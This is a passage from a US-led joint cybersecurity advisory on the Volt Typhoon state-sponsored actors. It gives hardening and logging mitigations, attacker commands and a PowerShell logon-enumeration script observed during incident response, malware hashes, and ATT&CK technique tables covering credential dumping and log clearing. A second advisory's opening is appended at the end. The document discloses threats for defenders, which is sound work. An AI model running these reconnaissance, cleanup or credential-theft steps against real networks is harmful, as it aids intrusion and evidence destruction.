Harden cloud assets in accordance with vendor-provided or industry standard hardening 
guidance. 
o Organizations with Microsoft cloud infrastructure, see CISA’s Microsoft 365 Security 
Configuration Baseline Guides, which provide minimum viable secure configuration 
baselines for Microsoft Defender for Office 365, Azure Active Directory (now known as 
Microsoft Entra ID), Exchange Online, OneDrive for Business, Power BI, Power Platform, 
SharePoint Online, and Teams. For additional guidance, see the Australian Signals 
Directorate’s Blueprint for Secure Cloud. 
 
 
 
TLP:CLEAR 
Page 27 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
o Organizations with Google cloud infrastructure, see CISA’s Google Workspace Security 
Configuration Baseline Guides, which provide minimum viable secure configuration 
baselines for Groups for Business, GMAIL, Google Calendar, Google Chat, Google 
Common Controls, Google Classroom, Google Drive and Docs, Google Meet, and Google 
Sites. 
• 
Revoke unnecessary public access to cloud environment. This involves reviewing and 
restricting public endpoints and ensuring that services like storage accounts, databases, and 
virtual machines are not publicly accessible unless absolutely necessary. Disable legacy 
authentication protocols across all cloud services and platforms. Legacy protocols frequently 
lack support for advanced security mechanisms such as multifactor authentication, rendering 
them susceptible to compromises. Instead, enforce the use of modern authentication protocols 
that support stronger security features like MFA, token-based authentication, and adaptive 
authentication measures. 
o Enforce this practice through the use of Conditional Access Policies. These policies 
can initially be run in report-only mode to identify potential impacts and plan mitigations 
before fully enforcing them. This approach allows organizations to systematically control 
access to their cloud resources, significantly reducing the risk of unauthorized access and 
potential compromise. 
• 
Regularly monitor and audit privileged cloud-based accounts, including service accounts, 
which are frequently abused to enable broad cloud resource access and persistence. 
Be Prepared 
• 
Ensure logging is turned on for application, access, and security logs (e.g., intrusion 
detection systems/intrusion prevention systems, firewall, data loss prevention, and VPNs) 
[CPG 2T]. Given Volt Typhoon’s use of LOTL techniques and their significant dwell time, 
application event logs may be a valuable resource to hunt for Volt Typhoon activity because 
these logs typically remain on endpoints for relatively long periods of time. 
o For OT assets where logs are non-standard or not available, collect network traffic and 
communications between those assets and other assets. 
o Implement file integrity monitoring (FIM) tools to detect unauthorized changes. 
• 
Store logs in a central system, such as a security information and event management 
(SIEM) tool or central database. 
o Ensure the logs can only be accessed or modified by authorized and authenticated 
users [CPG 2U]. 
o Store logs for a period informed by risk or pertinent regulatory guidelines. 
o Tune log alerting to reduce noise while ensuring there are alerts for high-risk 
activities. (For information on alert tuning, see joint guide Identifying and Mitigating Living 
Off the Land Techniques.) 
• 
Establish and continuously maintain a baseline of installed tools and software, account 
behavior, and network traffic. This way, network defenders can identify potential outliers, 
which may indicate malicious activity. Note: For information on establishing a baseline, see 
joint guide Identifying and Mitigating Living off the Land Techniques. 
 
 
 
TLP:CLEAR 
Page 28 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
• 
Document a list of threats and cyber actor TTPs relevant to your organization (e.g., 
based on industry or sectors), and maintain the ability (such as via rules, alerting, or 
commercial prevention and detection systems) to detect instances of those key threats [CPG 
3A]. 
• 
Implement periodic training for all employees and contractors that covers basic 
security concepts (such as phishing, business email compromise, basic operational security, 
password security, etc.), as well as fostering an internal culture of security and cyber 
awareness [CPG 2I]. 
o Tailor the training to network IT personnel/administrators and other key staff based 
on relevant organizational cyber threats and TTPs, such as Volt Typhoon. For 
example, communicate that Volt Typhoon actors are known to target personal email 
accounts of IT staff, and encourage staff to protect their personal email accounts by using 
strong passwords and implementing MFA. 
o In addition to basic cybersecurity training, ensure personnel who maintain or secure OT 
as part of their regular duties receive OT-specific cybersecurity training on at least 
an annual basis [CPG 2J]. 
o Educate users about the risks associated with storing unprotected passwords. 
OT Administrators and Defenders 
• 
Change default passwords [CPG 2A] and ensure they meet the policy requirements for 
complexity. If the asset’s password cannot be changed, implement compensating controls for 
the device; for example, segment the device into separate enclaves and implement increased 
monitoring and logging. 
• 
Require that passwords for all OT password-protected assets be at least 15 characters, 
when technically feasible. In instances where minimum passwords lengths are not technically 
feasible (for example, assets in remote locations), apply compensating controls, record the 
controls, and log all login attempts. [CPG 2B]. 
• 
Enforce strict access policies for accessing OT networks. Develop strict operating 
procedures for OT operators that details secure configuration and usage. 
• 
Segment OT assets from IT environments by [CPG 2F]: 
o Denying all connections to the OT network by default unless explicitly allowed (e.g., by 
IP address and port) for specific system functionality.  
o Requiring necessary communications paths between IT and OT networks to pass 
through an intermediary, such as a properly configured firewall, bastion host, “jump box,” 
or a demilitarized zone (DMZ), which is closely monitored, captures network logs, and only 
allows connections from approved assets. 
• 
Closely monitor all connections into OT networks for misuse, anomalous activity, or OT 
protocols. 
• 
Monitor for unauthorized controller change attempts. Implement integrity checks of 
controller process logic against a known good baseline. Ensure process controllers are 
prevented from remaining in remote program mode while in operation if possible. 
 
 
 
TLP:CLEAR 
Page 29 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
• 
Lock or limit set points in control processes to reduce the consequences of 
unauthorized controller access. 
• 
Be prepared by: 
o Determining your critical operational processes’ reliance on key IT infrastructure: 
 
Maintain and regularly update an inventory of all organizational OT assets. 
 
Understand and evaluate cyber risk on “as-operated” OT assets. 
 
Create an accurate “as-operated” OT network map and identify OT and IT network 
inter-dependencies. 
o Identifying a resilience plan that addresses how to operate if you lose access to or control 
of the IT and/or OT environment. 
 
Plan for how to continue operations if a control system is malfunctioning, inoperative, 
or actively acting contrary to the safe and reliable operation of the process. 
 
Develop workarounds or manual controls to ensure ICS networks can be isolated if the 
connection to a compromised IT environment creates risk to the safe and reliable 
operation of OT processes. 
o Create and regularly exercise an incident response plan. 
 
Regularly test manual controls so that critical functions can be kept running if OT 
networks need to be taken offline. 
o Implement regular data backup procedures on OT networks. 
 
Regularly test backup procedures. 
• 
Follow risk-informed guidance in the joint advisory NSA and CISA Recommend Immediate 
Actions to Reduce Exposure Across all Operational Technologies and Control Systems, the 
NSA advisory Stop Malicious Cyber Activity Against Connected Operational Technology. 
CONTACT INFORMATION 
US organizations: To report suspicious or criminal activity related to information found in this joint 
Cybersecurity Advisory, contact: 
• 
CISA’s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870 or your local FBI field 
office. When available, please include the following information regarding the incident: date, 
time, and location of the incident; type of activity; number of people affected; type of 
equipment used for the activity; the name of the submitting company or organization; and a 
designated point of contact. 
• 
For NSA client requirements or general cybersecurity inquiries, contact 
Cybersecurity_Requests@nsa.gov.  
• 
Water and Wastewater Systems Sector organizations, contact the EPA Water Infrastructure 
and Cyber Resilience Division at watercyberta@epa.gov to voluntarily provide situational 
awareness. 
• 
Entities required to report incidents to DOE should follow established reporting requirements, 
as appropriate. For other energy sector inquiries, contact EnergySRMA@hq.doe.gov. 
• 
For transportation entities regulated by TSA, report to CISA Central in accordance with the 
requirements found in applicable Security Directives, Security Programs, or TSA Order. 
 
 
 
TLP:CLEAR 
Page 30 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Australian organizations: Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report 
cybersecurity incidents and access alerts and advisories. 
Canadian organizations: Report incidents by emailing CCCS at contact@cyber.gc.ca. 
New Zealand organizations: Report cyber security incidents to incidents@ncsc.govt.nz or call 04 
498 7654. 
United Kingdom organizations: Report a significant cyber security incident: ncsc.gov.uk/report-an-
incident (monitored 24 hours) or, for urgent assistance, call 03000 200 973. 
VALIDATE SECURITY CONTROLS 
In addition to applying mitigations, the authoring agencies recommend exercising, testing, and 
validating your organization's security program against the threat behaviors mapped to the MITRE 
ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your 
existing security controls inventory to assess how they perform against the ATT&CK techniques 
described in this advisory. 
To get started: 
1. Select an ATT&CK technique described in this advisory (see Table 5 through Table 17). 
2. Align your security technologies against the technique. 
3. Test your technologies against the technique. 
4. Analyze your detection and prevention technologies’ performance. 
5. Repeat the process for all security technologies to obtain a set of comprehensive performance 
data. 
6. Tune your security program, including people, processes, and technologies, based on the 
data generated by this process. 
The authoring agencies recommend continually testing your security program, at scale, in a 
production environment to ensure optimal performance against the MITRE ATT&CK techniques 
identified in this advisory. 
REFERENCES 
[1] fofa 
[2] Microsoft: Volt Typhoon targets US critical infrastructure with living-off-the-land techniques 
[3] GitHub - fatedier/frp: A fast reverse proxy to help you expose a local server behind a NAT or 
firewall to the internet 
[4] GitHub - sandialabs/gait: Zeek Extension to Collect Metadata for Profiling of Endpoints and 
Proxies 
[5] The Zeek Network Security Monitor 
RESOURCES 
Microsoft: Volt Typhoon targets US critical infrastructure with living-off-the-land techniques 
 
 
 
TLP:CLEAR 
Page 31 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Secureworks: Chinese Cyberespionage Group BRONZE SILHOUETTE Targets U.S. Government 
and Defense Organizations 
DISCLAIMER 
The information in this report is being provided “as is” for informational purposes only. The authoring 
agencies do not endorse any commercial entity, product, company, or service, including any entities, 
products, or services linked within this document. Any reference to specific commercial entities, 
products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not 
constitute or imply endorsement, recommendation, or favoring by the authoring agencies. 
ACKNOWLEDGEMENTS 
Fortinet and Microsoft contributed to this advisory. 
VERSION HISTORY 
February 7, 2024: Initial Version. 
March 7, 2024: Updated Mitigations section to add recommendation on “end of life” technology. 
 
 
 
 
 
TLP:CLEAR 
Page 32 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
APPENDIX A: VOLT TYPHOON OBSERVED COMMANDS / LOTL ACTIVITY 
See Table 2 and Table 3 for Volt Typhoon commands and PowerShell scripts observed by the U.S. 
authoring agencies during incident response activities. For additional commands used by Volt 
Typhoon, see joint advisory People's Republic of China State-Sponsored Cyber Actor Living off the 
Land to Evade Detection. 
Table 2: Volt Typhoon Observed Commands in PowerShell Console History 
Command/Script 
Description/Use 
Get-EventLog security -instanceid 4624 -after 
{redacted date} | fl * | Out-File 
'C:\users\public\documents\user.dat'   
PowerShell command extracts security log 
entries with the Event ID 4624 after a specified 
date. The output is formatted (fl *) and saved 
to user.dat. Potentially used to analyze logon 
patterns and identify potential targets for lateral 
movement. 
Get-EventLog security -instanceid 4624 | Where-
Object {$_.message.contains('{redacted user 
account}')} | select -First 1 | fl *   
PowerShell command extracts security log 
entries with the Event ID 4624 and filters them 
to include only those containing a specific user 
account, selecting the first instance of such an 
event. 
wminc process get name,processid 
Appears to be an attempt to use the wmic 
command but with a misspelling (wminc instead 
of wmic). This command, as it stands, would 
not execute successfully and would return an 
error in a typical Windows environment. This 
could indicate a mistake made during manual 
input. 
wmic process get name,processid   
WMI command lists all running processes with 
process names and process IDs. Potentially 
used to find process IDs needed for other 
operations, like memory dumping. 
tasklist /v   
Command displays detailed information about 
currently running processes, including the 
name, PID, session number, and memory 
usage. 
 
 
 
TLP:CLEAR 
Page 33 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Command/Script 
Description/Use 
taskkill /f /im rdpservice.exe 
Command forcibly terminates the process 
rdpservice.exe. Potentially used as a 
cleanup activity post-exploitation. 
ping -n 1 {redacted IP address} 
Command sends one ICMP echo request to a 
specified IP address. 
ping -n 1 -w 1 {redacted IP address} 
Command sends one ICMP echo request to a 
specified IP address with a timeout (-w) of 1 
millisecond. 
net user 
Lists all user accounts on the local machine or 
domain, useful for quickly viewing existing user 
accounts. 
quser 
 
query user 
Displays information about user sessions on a 
system, aiding in identifying active users or 
sessions. 
net start 
Lists all active services. 
cmd 
Opens a new instance of the command prompt. 
cd [Redacted Path] 
Changes the current directory to a specified 
path, typically for navigating file systems. 
Remove-Item .\Thumbs.db 
PowerShell command to delete the Thumbs.db 
file, possibly for cleanup or removing traces. 
move .\Thumbs.db ttt.dat 
Relocates and renames the file Thumbs.db in 
the current directory to ttt.dat within the 
same directory. 
del .\Thumbs.db /f /s /q 
Force deletes Thumbs.db files from the current 
directory and all subdirectories, part of cleanup 
operations to erase traces. 
del ?? 
Deletes files with two-character names, 
potentially a targeted cleanup command. 
 
 
 
TLP:CLEAR 
Page 34 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Command/Script 
Description/Use 
del /? 
Displays help information for the del 
command. 
exit 
Terminates the command prompt session. 
ipconfig 
Retrieves network configuration details, helpful 
for discovery and mapping the victim's network. 
net time /dom 
Queries or sets the network time for a domain, 
potentially used for reconnaissance or to 
manipulate system time. 
netstta -ano 
Intended as netstat -ano; a mistyped 
command indicating a potential operational 
error. 
netstat -ano 
Lists active network connections and 
processes, helpful for identifying 
communication channels and potential targets. 
type .\Notes.txt 
Displays the contents of Notes.txt, possibly 
used for extracting specific information or 
intelligence gathering. 
logoff 
Logs off the current user session. 
Table 3: Volt Typhoon Observed PowerShell Scripts 
Script name and 
location 
Contents 
Description/Use 
C:\{redacted}\ 
logins.ps1 
# Find DC list from Active Directory 
$DCs = Get-ADDomainController -Filter * 
  
# Define time for report (default is 1 day) 
$startDate = (get-date).AddDays(-1) 
  
The script is designed for 
user logon discovery in a 
Windows Active Directory 
environment. It retrieves a 
list of DCs and then 
queries security logs on 
these DCs for successful 
logon events (Event ID 
4624) within the last day. 
The script differentiates 
 
 
 
TLP:CLEAR 
Page 35 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Script name and 
location 
Contents 
Description/Use 
# Store successful logon events from 
security logs with the specified dates and 
workstation/IP in an array 
foreach ($DC in $DCs){ 
$slogonevents = Get-Eventlog -LogName 
Security -ComputerName $DC.Hostname -
after $startDate | where {$_.eventID -eq 
4624 }} 
  
# Crawl through events; print all logon 
history with type, date/time, status, account 
name, computer and IP address if user 
logged on remotely 
  
 foreach ($e in $slogonevents){ 
 # Logon Successful Events 
 # Local (Logon Type 2) 
 if (($e.EventID -eq 4624 ) -and 
($e.ReplacementStrings[8] -eq 2)){ 
 write-host ""Type: Local Logon`tDate: 
""$e.TimeGenerated ""`tStatus: 
Success`tUser: ""$e.ReplacementStrings[5] 
""`tWorkstation: ""$e.ReplacementStrings[11] 
 } 
 # Remote (Logon Type 10) 
 if (($e.EventID -eq 4624 ) -and 
($e.ReplacementStrings[8] -eq 10)){ 
 write-host ""Type: Remote Logon`tDate: 
""$e.TimeGenerated ""`tStatus: 
Success`tUser: ""$e.ReplacementStrings[5] 
""`tWorkstation: ""$e.ReplacementStrings[11] 
""`tIP Address: ""$e.ReplacementStrings[18] 
 }} 
between local (Logon Type 
2) and remote (Logon 
Type 10) logon events. For 
each event, it extracts and 
displays details including 
the logon type, date/time of 
logon, status, account 
name, and the workstation 
or IP address used for the 
logon. Volt Typhoon may 
be leveraging this script to 
monitor user logon 
activities across the 
network, potentially to 
identify patterns, gather 
credentials, or track the 
movement of users and 
administrators within the 
network. 
 
 
 
 
 
TLP:CLEAR 
Page 36 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
APPENDIX B: INDICATORS OF COMPROMISE 
See Table 4 for Volt Typhoon IOCs obtained by the U.S. authoring agencies during incident response 
activities. 
Table 4: Volt Typhoon Malicious Files and Associated Hashes 
Note: See MAR-10448362-1.v1 for more information on this malware. 
File Name 
Description 
MD5 
Hashes (SHA256) 
BrightmetricAgent.exe 
The file is an FRP that 
could be used to 
reveal servers situated 
behind a network 
firewall or obscured 
through Network 
Address Translation 
(NAT). 
 
fd41134e8ead1c18cca
d27c62a260aa6 
edc0c63065e88ec961
97c8d7a40662a15a81
2a9583dc6c82b18ecd
7e43b13b70 
SMSvcService.exe 
The file is a Windows 
executable ""FRPC” 
designed to open a 
reverse proxy 
between the 
compromised system 
and the threat actor(s) 
C2 server. 
b1de37bf229890ac181
bdef1ad8ee0c2 
99b80c5ac352081a64
129772ed5e1543d94c
ad708ba2adc46dc4ab
7a0bd563f1 
 
 
 
 
 
 
TLP:CLEAR 
Page 37 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
APPENDIX C: MITRE ATT&CK TACTICS AND TECHNIQUES 
See Table 5 through Table 17 for all referenced threat actor tactics and techniques in this advisory. 
Table 5: Volt Typhoon actors ATT&CK Techniques for Enterprise – Reconnaissance 
Reconnaissance 
Technique Title 
ID 
Use 
Gather Victim Host 
Information 
T1592 
Volt Typhoon conducts extensive pre-compromise 
reconnaissance. This includes web searches, including victim-
owned sites, for victim host, identity, and network information, 
especially for information on key network and IT 
administrators. 
Gather Victim 
Identity Information 
T1589 
Volt Typhoon conducts extensive pre-compromise 
reconnaissance to learn about the target organization’s staff. 
Gather Victim 
Identity Information: 
Email Addresses 
T1589.002 
Volt Typhoon targets the personal emails of key network and 
IT staff. 
Gather Victim 
Network Information 
T1590 
Volt Typhoon conducts extensive pre-compromise 
reconnaissance to learn about the target organization’s 
network. 
Gather Victim Org 
Information 
T1591 
Volt Typhoon conducts extensive pre-compromise 
reconnaissance to learn about the target organization. 
Search Open 
Websites/Domains 
T1593 
Volt Typhoon conducts extensive pre-compromise 
reconnaissance. This includes web searches, including victim-
owned sites, for victim host, identity, and network information, 
especially for information on key network and IT 
administrators. 
Search Victim-
Owned Websites 
T1594 
Volt Typhoon conducts extensive pre-compromise 
reconnaissance. This includes web searches, including victim-
owned sites, for victim host, identity, and network information, 
especially for information on key network and IT 
administrators. 
 
 
 
TLP:CLEAR 
Page 38 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Table 6: Volt Typhoon actors ATT&CK Techniques for Enterprise – Resource Development 
Resource Development 
Technique Title 
ID 
Use 
Acquire 
Infrastructure: 
Botnet 
T1583.003 
Volt Typhoon uses multi-hop proxies for command-and-control 
infrastructure. The proxy is typically composed of Virtual 
Private Servers (VPSs) or small office/home office (SOHO) 
routers. 
Compromise 
Infrastructure: 
Botnet 
T1584.005 
Volt Typhoon used Cisco and NETGEAR end-of-life SOHO 
routers implanted with KV Botnet malware to support their 
operations. 
Compromise 
Infrastructure: 
Server 
T1584.004 
Volt Typhoon has redirected specific port traffic to their proxy 
infrastructure, effectively converting the PRTG’s Detection 
Guidance server into a proxy for their C2 traffic. 
Develop 
Capabilities: Exploits 
T1587.004 
Volt Typhoon uses publicly available exploit code, but is also 
adept at discovering and exploiting vulnerabilities as zero 
days. 
Obtain Capabilities: 
Exploits 
T1588.005 
Volt Typhoon uses publicly available exploit code, but is also 
adept at discovering and exploiting vulnerabilities as zero 
days.  
Table 7: Volt Typhoon actors ATT&CK Techniques for Enterprise – Initial Access 
Initial Access  
Technique Title 
ID 
Use 
Exploit Public-
Facing Application 
T1190 
Volt Typhoon commonly exploits vulnerabilities in networking 
appliances such as Fortinet, Ivanti (formerly Pulse Secure), 
NETGEAR, Citrix, and Cisco. 
External Remote 
Services 
T1133 
Volt Typhoon often uses VPN sessions to securely connect to 
victim environments, enabling discreet follow-on intrusion 
activities.  
 
 
 
TLP:CLEAR 
Page 39 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Table 8: Volt Typhoon actors ATT&CK Techniques for Enterprise – Execution 
Execution 
Technique Title 
ID 
Use 
Command and 
Scripting Interpreter 
T1059 
Volt Typhoon uses hands-on-keyboard execution for their 
malicious activity via the command-line. 
Command and 
Scripting Interpreter: 
PowerShell 
T1059.001 
Volt Typhoon has executed clients via PowerShell. 
Command and 
Scripting Interpreter: 
Unix Shell 
T1059.004 
Volt Typhoon has used Brightmetricagent.exe, which 
contains multiplexer libraries that can bi-directionally stream 
data over through NAT networks and contains a command-
line interface (CLI) library that can leverage command shells 
such as PowerShell, Windows Management, Instrumentation 
(WMI), and Z Shell (zsh). 
Windows 
Management 
Instrumentation 
T1047 
Volt Typhoon has used Windows Management 
Instrumentation Console (WMIC) commands. 
Table 9: Volt Typhoon actors ATT&CK Techniques for Enterprise – Persistence 
Persistence 
Technique Title 
ID 
Use 
Valid Accounts 
T1078 
Volt Typhoon primarily relies on valid credentials for 
persistence.  
Table 10: Volt Typhoon actors ATT&CK Techniques for Enterprise – Privilege Escalation 
Privilege Escalation 
Technique Title 
ID 
Use 
Exploitation for 
Privilege Escalation 
T1068 
Volt Typhoon first obtains credentials from public-facing 
appliances after gaining initial access by exploiting privilege 
 
 
 
TLP:CLEAR 
Page 40 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
escalation vulnerabilities in the operating system or network 
services. 
Table 11: Volt Typhoon actors ATT&CK Techniques for Enterprise – Defense Evasion 
Defense Evasion 
Technique Title 
ID 
Use 
Direct Volume 
Access 
T1006 
Volt Typhoon has executed the Windows-native vssadmin 
command to create a volume shadow copy. 
Indicator Removal: 
Clear Persistence 
T1070.009 
Volt Typhoon has selectively cleared Windows Event Logs, 
system logs, and other technical artifacts to remove evidence 
of their intrusion activity and masquerading file names. 
Indicator Removal: 
Clear Windows 
Event Logs 
T1070.001 
Volt Typhoon has selectively cleared Windows Event Logs, 
system logs, and other technical artifacts to remove evidence 
of their intrusion activity and masquerading file names. 
Indicator Removal: 
File Deletion 
T1070.004 
Volt Typhoon created systeminfo.dat in 
C:\Users\Public\Documents, but subsequently deleted it.  
Masquerading: 
Match Legitimate 
Name or Location 
T1036.005 
Volt Typhoon has selectively cleared Windows Event Logs, 
system logs, and other technical artifacts to remove evidence 
of their intrusion activity and masquerading file names. 
Modify Registry 
T1112 
Volt Typhoon has used the netsh command, a legitimate 
Windows command, to create a PortProxy registry 
modification on the PRTG server. 
Obfuscated Files or 
Information: 
Software Packing 
T1027.002 
Volt Typhoon has obfuscated FRP client files 
(BrightmetricAgent.exe and SMSvcService.exe) and the 
command-line port scanning utility ScanLine by packing the 
files with Ultimate Packer for Executables (UPX). 
System Binary 
Proxy Execution 
T1218 
Volt Typhoon uses hands-on-keyboard activity via the 
command-line and use other native tools and processes on 
systems (often referred to as “LOLBins”), known as LOTL, to 
maintain and expand access to the victim networks. 
 
 
 
TLP:CLEAR 
Page 41 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Table 12: Volt Typhoon actors ATT&CK Techniques for Enterprise – Credential Access 
Credential Access 
Technique Title 
ID 
Use 
Brute Force: 
Password Cracking 
T1110.002 
Volt Typhoon has exfiltrated NTDS.dit and SYSTEM registry 
hive to crack passwords offline. 
Credentials from 
Password Stores 
T1555 
Volt Typhoon has installed browsers saved passwords history, 
credit card details, and cookies.  
Credentials from 
Password Stores: 
Credentials from 
Web Browsers 
T1555.003 
Volt Typhoon has strategically targeted network administrator 
web browser data, focusing on both browsing history and 
stored credentials. 
OS Credential 
Dumping: LSASS 
Memory 
T1003.001 
Volt Typhoon used a DLL with MiniDump and the process ID 
of Local Security Authority Subsystem Service (LSASS) to 
dump the LSASS process memory and obtain credentials. 
OS Credential 
Dumping: NTDS 
T1003.003 
Volt Typhoon appears to prioritize obtaining valid credentials 
by extracting the Active Directory database file (NTDS.dit). 
Unsecured 
Credentials 
T1552 
Volt Typhoon has obtained credentials insecurely stored on an 
appliance. 
Unsecured 
Credentials: Private 
Keys 
T1552.004 
Volt Typhoon has accessed a Local State file that contains the 
Advanced Encryption Standard (AES) encryption key used to 
encrypt the passwords stored in the Chrome browser, which 
enables the actors to obtain plaintext passwords stored in the 
Login Data file in the Chrome browser. 
Table 13: Volt Typhoon actors ATT&CK Techniques for Enterprise – Discovery 
Discovery 
Technique Title 
ID 
Use 
Account Discovery: 
Local Account 
T1087.001 
Volt Typhoon executed net user and quser for user account 
information. 
 
 
 
TLP:CLEAR 
Page 42 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Application Window 
Discovery 
T1010 
Volt Typhoon created and accessed a file named 
rult3uil.log on a Domain Controller in 
C:\Windows\System32\. The rult3uil.log file contained 
user activities on a compromised system, showcasing a 
combination of window title information and focus shifts, 
keypresses, and command executions across Google Chrome 
and Windows PowerShell, with corresponding timestamps. 
Browser Information 
Discovery 
T1217 
Volt Typhoon has installed browsers saved passwords history, 
credit card details, and cookies. 
File and Directory 
Discovery 
T1083 
Volt Typhoon enumerated several directories, including 
directories containing vulnerability testing and cyber related 
content and facilities data, such as construction drawings. 
Log Enumeration 
T1654 
Volt Typhoon has captured successful logon events. 
Network Service 
Discovery 
T1046 
Volt Typhoon has used commercial tools, LOTL utilities, and 
appliances already present on the system for system 
information, network service, group, and user discovery. 
Peripheral Device 
Discovery 
T1120 
Volt Typhoon has obtained the victim's system screen 
dimension and display devices information. 
Permission Groups 
Discovery 
T1069 
Volt Typhoon has used commercial tools, LOTL utilities, and 
appliances already present on the system for system 
information, network service, group, and user discovery. 
Process Discovery 
T1057 
Volt Typhoon executed tasklist /v to gather a detailed 
process listing. 
Query Registry 
T1012 
Volt Typhoon has interacted with a PuTTY application by 
enumerating existing stored sessions. 
Software Discovery 
T1518 
Volt Typhoon has obtained the victim's list of applications 
installed on the victim's system. 
System Information 
Discovery 
T1082 
Volt Typhoon has used commercial tools, LOTL utilities, and 
appliances already present on the system for system 
information, network service, group, and user discovery. 
 
 
 
TLP:CLEAR 
Page 43 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
System Location 
Discovery 
T1614 
Volt Typhoon has obtained the victim's system current locale. 
System Network 
Configuration 
Discovery: Internet 
Connection 
Discovery 
T1016.001 
Volt Typhoon employs ping with various IP addresses to 
check network connectivity and net start to list running 
services. 
System Owner/User 
Discovery 
T1033 
Volt Typhoon has used commercial tools, LOTL utilities, and 
appliances already present on the system for system 
information, network service, group, and user discovery. 
System Service 
Discovery 
T1007 
Volt Typhoon employs ping with various IP addresses to 
check network connectivity and net start to list running 
services. 
System Time 
Discovery 
T1124 
Volt Typhoon has obtained the victim's system timezone. 
Table 14: Volt Typhoon actors ATT&CK Techniques for Enterprise – Lateral Movement 
Lateral Movement 
Technique Title 
ID 
Use 
Remote Service 
Session Hijacking 
T1563 
Volt Typhoon potentially had access to a range of critical 
PuTTY profiles, including those for water treatment plants, 
water wells, an electrical substation, operational technology 
systems, and network security devices. This would enable 
them to access these critical systems. 
Remote Services: 
Cloud Services 
T1021.007 
During the period of Volt Typhoon’s known network presence, 
there were anomalous login attempts to an Azure tenant 
potentially using credentials previously compromised from 
theft of NTDS.dit. 
Remote Services: 
Remote Desktop 
Protocol 
T1021.001 
Volt Typhoon has moved laterally to the Domain Controller via 
an interactive RDP session using a compromised account with 
domain administrator privileges. 
 
 
 
TLP:CLEAR 
Page 44 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Use Alternate 
Authentication 
Material 
T1550 
Volt Typhoon may be capable of using other methods such as 
Pass the Hash or Pass the Ticket for lateral movement. 
Valid Accounts: 
Cloud Accounts 
T1078.004 
During the period of Volt Typhoon’s known network presence, 
there were anomalous login attempts to an Azure tenant 
potentially using credentials previously compromised from 
theft of NTDS.dit. 
Table 15: Volt Typhoon actors ATT&CK Techniques for Enterprise – Collection 
Collection 
Technique Title 
ID 
Use 
Archive Collected 
Data 
T1560 
Volt Typhoon collected sensitive information obtained from a 
file server in multiple zipped files. 
Archive Collected 
Data: Archive via 
Utility 
T1560.001 
Volt Typhoon has compressed and archived the extracted 
ntds.dit and accompanying registry files (by executing 
ronf.exe, which was likely a renamed version of rar.exe). 
Data Staged 
T1074 
Volt Typhoon accessed the file 
C:\Users\{redacted}\Downloads\History.zip, which 
presumably contained data from the User Data directory of the 
user’s Chrome browser, which the actors likely saved in the 
Downloads directory for exfiltration. 
Screen Capture 
T1113 
Volt Typhoon has obtained a screenshot of the victim's system 
using two libraries (gdi32.dll and gdiplus.dll) 
Table 16: Volt Typhoon actors ATT&CK Techniques for Enterprise – Command and Control 
Command and Control 
Technique Title 
ID 
Use 
Encrypted Channel 
T1573 
Volt Typhoon has setup FRP clients on a victim’s corporate 
infrastructure to establish covert communications channels for 
command and control. 
 
 
 
TLP:CLEAR 
Page 45 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Ingress Tool 
Transfer 
T1105 
Volt Typhoon uses legitimate, but outdated versions of 
network admin tools. For example, in one confirmed 
compromise, actors downloaded an outdated version of 
comsvcs.dll, on the DC in a non-standard folder.  
Proxy 
T1090 
Volt Typhoon has setup FRP clients on a victim’s corporate 
infrastructure to establish covert communications channels for 
command and control.  
Proxy: Internal 
Proxy 
T1090.001 
Volt Typhoon has used the netsh command, a legitimate 
Windows command, to create a PortProxy registry 
modification on the PRTG server. 
Proxy: Multi-hop 
Proxy 
T1090.003 
Volt Typhoon uses multi-hop proxies for command-and-control 
infrastructure. 
Table 17: Volt Typhoon actors ATT&CK Techniques for Enterprise – Exfiltration 
Exfiltration 
Technique Title 
ID 
Use 
Exfiltration Over 
Alternative Protocol  
T1048 
Volt Typhoon exfiltrated files via Server Message Block 
(SMB). 
 
",PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure,
01-16-2024,https://firebasestorage.googleapis.com/v0/b/ooda-nsec.appspot.com/o/data%2Faa24-016a-known-indicators-of-compromise-associated-with-adroxgh0st-malware_0.pdf?alt=media&token=413b3430-b71a-47fd-9ea0-86f9077c4ca5," 
 
 
 
 
 
 
 
 
 
  
 
 
To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact 
your local FBI field office at fbi.gov/contact-us/field-offices. When available, please include the following 
information regarding the incident: date, time, and location of the incident; type of activity; number of people 
affected; type of equipment used for the activity; the name of the submitting company or organization; and a 
designated point of contact. To request incident response resources or technical assistance related to these 
threats, contact CISA at report@cisa.dhs.gov. 
This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information 
carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public 
release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction. 
For more information on the Traffic Light Protocol, see cisa.gov/tlp/. 
Product ID: AA24-016A 
 
January 16, 2024 
Co-Authored by: 
TLP:CLEAR 
TLP:CLEAR 
Known Indicators of Compromise Associated 
with Androxgh0st Malware 
SUMMARY 
The Federal Bureau of Investigation (FBI) and the 
Cybersecurity and Infrastructure Security Agency (CISA) 
are releasing this joint Cybersecurity Advisory (CSA) to 
disseminate known indicators of compromise (IOCs) and 
tactics, techniques, and procedures (TTPs) associated 
with threat actors deploying Androxgh0st malware. 
Multiple, ongoing investigations and trusted third party 
